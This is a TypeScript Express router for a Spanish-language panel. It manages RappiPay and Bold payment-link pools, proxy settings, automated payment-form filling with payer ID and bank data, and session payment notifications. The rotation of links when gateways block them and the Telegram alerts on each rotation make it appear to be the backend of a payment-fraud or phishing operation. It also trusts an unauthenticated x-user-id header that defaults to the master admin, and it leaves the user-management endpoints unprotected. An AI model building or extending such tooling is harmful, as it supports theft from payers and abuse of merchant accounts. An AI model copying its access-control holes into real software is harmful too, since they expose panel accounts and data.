import { Router, Request, Response } from 'express';
import {
  MASTER_ADMIN_ID,
  resolveOwnerId,
  updatePanelUserSlug,
  getGatewaySettings,
  updateGatewaySettings,
  detectGatewayFromUrl,
  getTransactions,
  GatewayProvider,
  getPanelUsers,
  findUserByPassword,
  createPanelUser,
  updatePanelUserPassword,
  deletePanelUser,
  getRappiLinksPool,
  getPoolSummary,
  getLinkLogs,
  addRappiLinksToPool,
  activateRappiLinkInPool,
  removeRappiLinkFromPool,
  markLinkBlockedAndRotate,
  recordLinkEvent,
  incrementRappiLinkUse,
  recordTransaction,
  updateTransactionStatus,
  subscribeDashboardUpdates,
  TransactionRecord,
} from '../services/settings.service';
import { verifyBoldAccountStatus } from '../services/bold-api.service';
import { executeFillReal, executeFillBold, executeFillBoldApi } from '../services/fill.service';
import { sendLinkRotationTelegramAlert } from '../services/telemetry.service';
import { startTrackingRappiPayment, resumePendingRappiTrackers } from '../services/rappi-tracker.service';
import {
  notifySessionPaymentConfirmed,
  notifySessionPaymentRejected,
} from '../controllers/track.controller';

const router = Router();

function extractUserId(req: Request): string {
  const fromHeader = req.headers['x-user-id'];
  const fromQuery = req.query?.userId;
  const fromBody = req.body?.userId;
  const raw = String(fromHeader || fromQuery || fromBody || MASTER_ADMIN_ID).trim();
  return resolveOwnerId(raw);
}

router.post('/auth', (req: Request, res: Response) => {
  try {
    const { password } = req.body || {};
    const user = findUserByPassword(String(password || ''));
    if (!user) {
      return res.status(401).json({
        ok: false,
        error: 'Contraseña de acceso inválida.',
      });
    }
    return res.json({
      ok: true,
      user: {
        id: user.id,
        name: user.name,
        role: user.role,
        slug: user.slug,
        firebaseEmail: user.firebaseEmail,
        firebaseUid: user.firebaseUid,
      },
    });
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      error: err.message || 'Error verificando contraseña',
    });
  }
});

router.put('/my-slug', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const { slug } = req.body || {};
    const updatedUser = updatePanelUserSlug(ownerId, String(slug || ''));
    return res.json({
      ok: true,
      user: updatedUser,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'No se pudo actualizar la extensión.',
    });
  }
});

router.get('/users', (_req: Request, res: Response) => {
  return res.json({
    ok: true,
    users: getPanelUsers(),
  });
});

router.post('/users', (req: Request, res: Response) => {
  try {
    const { name, password, role, slug, firebaseUid, firebaseEmail } = req.body || {};
    const created = createPanelUser({ name, password, role, slug, firebaseUid, firebaseEmail });
    return res.json({
      ok: true,
      user: created,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error creando el usuario',
    });
  }
});

router.put('/users/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { password, name } = req.body || {};
    const updated = updatePanelUserPassword(id, password, name);
    return res.json({
      ok: true,
      user: updated,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error actualizando contraseña del usuario',
    });
  }
});

router.delete('/users/:id', (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    deletePanelUser(id);
    return res.json({
      ok: true,
      users: getPanelUsers(),
    });
  } catch (err: any) {
    return res.status(400).json({
      ok: false,
      error: err.message || 'Error eliminando el usuario',
    });
  }
});

function buildDashboardSnapshot(userId = MASTER_ADMIN_ID) {
  const ownerId = resolveOwnerId(userId);
  const settings = getGatewaySettings(ownerId);
  const detectedInfo = detectGatewayFromUrl(settings.paymentUrl);
  const transactions = getTransactions(ownerId);
  const userProfile = getPanelUsers().find((u) => u.id === ownerId) || null;

  const totalGenerated = transactions.length;
  const approvedList = transactions.filter((t) => t.status === 'APPROVED');
  const pendingList = transactions.filter(
    (t) => t.status === 'GENERATED' || t.status === 'PROCESSING' || t.status === 'INITIATED'
  );
  const totalApprovedAmount = approvedList.reduce((acc, t) => acc + (t.monto || 0), 0);
  const totalPendingAmount = pendingList.reduce((acc, t) => acc + (t.monto || 0), 0);
  const totalGeneratedAmount = transactions.reduce((acc, t) => acc + (t.monto || 0), 0);

  return {
    ok: true,
    ownerId,
    userProfile: userProfile
      ? { id: userProfile.id, name: userProfile.name, role: userProfile.role, slug: userProfile.slug }
      : null,
    settings,
    detectedInfo,
    rappiPool: getRappiLinksPool(ownerId),
    poolSummary: getPoolSummary(ownerId),
    linkLogs: getLinkLogs(ownerId).slice(0, 60),
    stats: {
      totalGenerated,
      totalApproved: approvedList.length,
      totalPending: pendingList.length,
      totalErrors: transactions.filter((t) => t.status === 'ERROR' || t.status === 'REJECTED').length,
      totalApprovedAmount,
      totalPendingAmount,
      totalGeneratedAmount,
    },
    transactions: transactions.slice(0, 50),
  };
}

router.get('/settings', (req: Request, res: Response) => {
  const ownerId = extractUserId(req);
  resumePendingRappiTrackers();
  return res.json(buildDashboardSnapshot(ownerId));
});

router.get('/stream', (req: Request, res: Response) => {
  const ownerId = extractUserId(req);
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const sendSnapshot = () => {
    try {
      res.write(`data: ${JSON.stringify(buildDashboardSnapshot(ownerId))}\n\n`);
    } catch {
      // ignore
    }
  };

  sendSnapshot();
  const unsubscribe = subscribeDashboardUpdates(sendSnapshot);
  const keepAlive = setInterval(() => {
    try {
      res.write(': ping\n\n');
    } catch {
      // ignore
    }
  }, 15000);

  req.on('close', () => {
    clearInterval(keepAlive);
    unsubscribe();
  });
});

router.put('/transactions/:id/status', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const { id } = req.params;
    const { status } = req.body || {};
    const validStatuses: TransactionRecord['status'][] = [
      'INITIATED',
      'PROCESSING',
      'GENERATED',
      'APPROVED',
      'REJECTED',
      'ERROR',
    ];
    if (!validStatuses.includes(status)) {
      return res.status(400).json({ ok: false, error: 'Estado no válido' });
    }
    const prevTx = getTransactions(ownerId).find((t) => t.id === id);
    updateTransactionStatus(id, status);
    if (prevTx && prevTx.status !== status) {
      if (status === 'APPROVED') {
        notifySessionPaymentConfirmed(prevTx.sessionId, {
          monto: prevTx.monto,
          reference: prevTx.id,
          paymentMethod: prevTx.banco,
          gateway: prevTx.gateway,
          nombre: prevTx.nombre,
          doc: prevTx.doc,
          status: 'APROBADO MANUAL EN PANEL',
        });
      } else if (status === 'REJECTED') {
        notifySessionPaymentRejected(prevTx.sessionId, {
          monto: prevTx.monto,
          reference: prevTx.id,
          gateway: prevTx.gateway,
          banco: prevTx.banco,
          nombre: prevTx.nombre,
          status: 'CANCELADO MANUAL EN PANEL',
        });
      }
    }
    return res.json(buildDashboardSnapshot(ownerId));
  } catch (err: any) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

router.put('/settings', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const body = req.body || {};
    const patch: Record<string, any> = {};

    if (typeof body.paymentUrl === 'string') {
      patch.paymentUrl = body.paymentUrl.trim();
    }
    if (typeof body.rappiUrl === 'string') {
      patch.rappiUrl = body.rappiUrl.trim();
    }
    if (typeof body.boldUrl === 'string') {
      patch.boldUrl = body.boldUrl.trim();
    }
    if (typeof body.boldApiKey === 'string') {
      patch.boldApiKey = body.boldApiKey.trim();
    }
    if (typeof body.boldSecretKey === 'string') {
      patch.boldSecretKey = body.boldSecretKey.trim();
    }
    if (typeof body.boldMerchantName === 'string') {
      patch.boldMerchantName = body.boldMerchantName.trim();
    }
    if (typeof body.gatewayProvider === 'string') {
      const gp = body.gatewayProvider.toLowerCase();
      if (gp === 'rappipay' || gp === 'bold_api' || gp === 'bold') {
        patch.gatewayProvider = gp as GatewayProvider;
      }
    }
    if (typeof body.proxyHost === 'string') patch.proxyHost = body.proxyHost.trim();
    if (typeof body.proxyPort === 'string') patch.proxyPort = body.proxyPort.trim();
    if (typeof body.proxyUsername === 'string') patch.proxyUsername = body.proxyUsername.trim();
    if (typeof body.proxyPassword === 'string') patch.proxyPassword = body.proxyPassword.trim();

    const updated = updateGatewaySettings(patch, ownerId);
    if (updated.gatewayProvider === 'rappipay' && updated.rappiUrl) {
      addRappiLinksToPool([updated.rappiUrl], ownerId);
    }
    const detectedInfo = detectGatewayFromUrl(updated.paymentUrl);

    return res.json({
      ok: true,
      settings: updated,
      detectedInfo,
      rappiPool: getRappiLinksPool(ownerId),
      poolSummary: getPoolSummary(ownerId),
    });
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      error: err.message || 'Error actualizando la configuración',
    });
  }
});

router.post('/verify-bold', async (req: Request, res: Response) => {
  try {
    const { boldApiKey, boldUrl } = req.body || {};
    const result = await verifyBoldAccountStatus(boldApiKey, boldUrl);
    return res.json(result);
  } catch (err: any) {
    return res.status(500).json({
      ok: false,
      status: 'ERROR',
      detail: err.message || 'Error al verificar cuenta en Bold',
    });
  }
});

// ==================== RAPPIPAY POOL ENDPOINTS (ISOLATED PER USER) ====================
router.post('/rappi-pool', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const { urls } = req.body || {};
    let list: string[] = [];
    if (Array.isArray(urls)) {
      list = urls.map(String);
    } else if (typeof urls === 'string') {
      list = urls
        .split(/[\r\n,]+/)
        .map((s) => s.trim())
        .filter(Boolean);
    }
    if (list.length === 0) {
      return res.status(400).json({ ok: false, error: 'Debes ingresar al menos un link de RappiPay.' });
    }
    const pool = addRappiLinksToPool(list, ownerId);
    recordLinkEvent(
      {
        type: 'ADDED',
        gateway: 'rappipay',
        url: list[0],
        reason: `Se agregaron ${list.length} link(s) a la cola de rotación automática.`,
      },
      ownerId
    );
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(ownerId),
      linkLogs: getLinkLogs(ownerId).slice(0, 60),
      settings: getGatewaySettings(ownerId),
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error agregando links al pool' });
  }
});

router.post('/rappi-pool/activate', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const { id } = req.body || {};
    const pool = activateRappiLinkInPool(String(id || ''), ownerId);
    const settings = getGatewaySettings(ownerId);
    recordLinkEvent(
      {
        type: 'ROTATED',
        gateway: 'rappipay',
        url: settings.rappiUrl,
        nextUrl: settings.rappiUrl,
        reason: 'Activado manualmente desde el Dashboard.',
      },
      ownerId
    );
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(ownerId),
      linkLogs: getLinkLogs(ownerId).slice(0, 60),
      settings,
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error activando link' });
  }
});

router.delete('/rappi-pool/:id', (req: Request, res: Response) => {
  try {
    const ownerId = extractUserId(req);
    const { id } = req.params;
    const pool = removeRappiLinkFromPool(id, ownerId);
    return res.json({
      ok: true,
      rappiPool: pool,
      poolSummary: getPoolSummary(ownerId),
      settings: getGatewaySettings(ownerId),
    });
  } catch (err: any) {
    return res.status(400).json({ ok: false, error: err.message || 'Error eliminando link del pool' });
  }
});

// ==================== LIVE LINK TESTER / SIMULATOR (ISOLATED PER USER) ====================
router.post('/test-link', async (req: Request, res: Response) => {
  const startMs = Date.now();
  const ownerId = extractUserId(req);
  const settings = getGatewaySettings(ownerId);
  const {
    url,
    monto = '15000',
    banco = 'NEQUI',
    tipo = 'Cédula de ciudadania',
    doc = '1020304050',
    nombre = 'Prueba Diagnóstico',
    email = 'prueba@gmail.com',
    celular = '3104567890',
  } = req.body || {};

  const targetUrl = String(url || settings.paymentUrl || '').trim();
  const detected = detectGatewayFromUrl(targetUrl);
  const cleanMonto = String(monto).replace(/\D/g, '') || '15000';
  const cleanDoc = String(doc).replace(/\D/g, '') || '1020304050';

  const gatewayToTest: GatewayProvider =
    detected.detected === 'rappipay'
      ? 'rappipay'
      : detected.detected === 'bold'
      ? settings.gatewayProvider === 'bold_api'
        ? 'bold_api'
        : 'bold'
      : settings.gatewayProvider;

  const testTx = recordTransaction(
    {
      sessionId: `test_${Date.now()}`,
      nombre: `[PRUEBA] ${String(nombre)}`,
      doc: cleanDoc,
      banco: String(banco),
      monto: Number(cleanMonto),
      gateway: gatewayToTest,
      status: 'PROCESSING',
    },
    ownerId
  );

  try {
    let result;
    if (gatewayToTest === 'rappipay') {
      result = await executeFillReal(
        {
          url: targetUrl,
          monto: cleanMonto,
          banco: String(banco),
          tipo: String(tipo),
          doc: cleanDoc,
          nombre: String(nombre),
          email: String(email),
          celular: String(celular),
        },
        ownerId
      );
      incrementRappiLinkUse(targetUrl, ownerId);
    } else if (gatewayToTest === 'bold') {
      result = await executeFillBold(
        {
          url: targetUrl,
          monto: cleanMonto,
          banco: String(banco),
          tipo: String(tipo),
          doc: cleanDoc,
          nombre: String(nombre),
          email: String(email),
          celular: String(celular),
        },
        ownerId
      );
    } else {
      result = await executeFillBoldApi(
        {
          url: targetUrl,
          monto: cleanMonto,
          banco: String(banco),
          tipo: String(tipo),
          doc: cleanDoc,
          nombre: String(nombre),
          email: String(email),
          celular: String(celular),
        },
        ownerId
      );
    }

    const durationMs = Date.now() - startMs;
    updateTransactionStatus(testTx.id, 'GENERATED', {
      redirectUrl: result.redirect_url,
      referenceId: result.reference_id,
    });
    if (gatewayToTest === 'rappipay') {
      startTrackingRappiPayment({
        txId: testTx.id,
        sessionId: testTx.sessionId,
        redirectUrl: result.redirect_url,
        kushkiUrl: result.kushki_url,
        amount: Number(cleanMonto),
        banco: String(banco),
        nombre: String(nombre),
        doc: cleanDoc,
      });
    }
    recordLinkEvent(
      {
        type: 'TEST_OK',
        gateway: gatewayToTest,
        url: targetUrl,
        nextUrl: result.redirect_url,
        reason: `Prueba exitosa (${(durationMs / 1000).toFixed(1)}s) -> Redirección generada correctamente.`,
      },
      ownerId
    );

    return res.json({
      ok: true,
      status: 'ACTIVE',
      gatewayTested: gatewayToTest,
      testedUrl: targetUrl,
      redirectUrl: result.redirect_url,
      proxyIp: result.proxy_ip || 'Directo / API',
      durationMs,
      detail: 'El link está ACTIVO y generó redirección bancaria PSE correctamente.',
      rappiPool: getRappiLinksPool(ownerId),
      poolSummary: getPoolSummary(ownerId),
      linkLogs: getLinkLogs(ownerId).slice(0, 60),
      transactions: getTransactions(ownerId).slice(0, 50),
      settings: getGatewaySettings(ownerId),
    });
  } catch (err: any) {
    const durationMs = Date.now() - startMs;
    const reason = err.message || 'El link no respondió o fue rechazado por la pasarela.';
    updateTransactionStatus(testTx.id, 'ERROR', {
      errorMessage: reason,
    });

    const rotation = markLinkBlockedAndRotate(
      targetUrl,
      `Fallo en prueba manual: ${reason}`,
      gatewayToTest,
      ownerId
    );
    await sendLinkRotationTelegramAlert({
      gateway: gatewayToTest,
      blockedUrl: targetUrl,
      nextUrl: rotation.rotatedTo,
      reason: `Prueba desde Dashboard: ${reason}`,
      activeRemaining: rotation.activeRemaining,
      blockedTotal: rotation.blockedTotal,
    }).catch(() => {});

    return res.json({
      ok: false,
      status: 'BLOCKED',
      gatewayTested: gatewayToTest,
      testedUrl: targetUrl,
      rotatedTo: rotation.rotatedTo,
      durationMs,
      detail: reason,
      rappiPool: getRappiLinksPool(ownerId),
      poolSummary: getPoolSummary(ownerId),
      linkLogs: getLinkLogs(ownerId).slice(0, 60),
      transactions: getTransactions(ownerId).slice(0, 50),
      settings: getGatewaySettings(ownerId),
    });
  }
});

export default router;
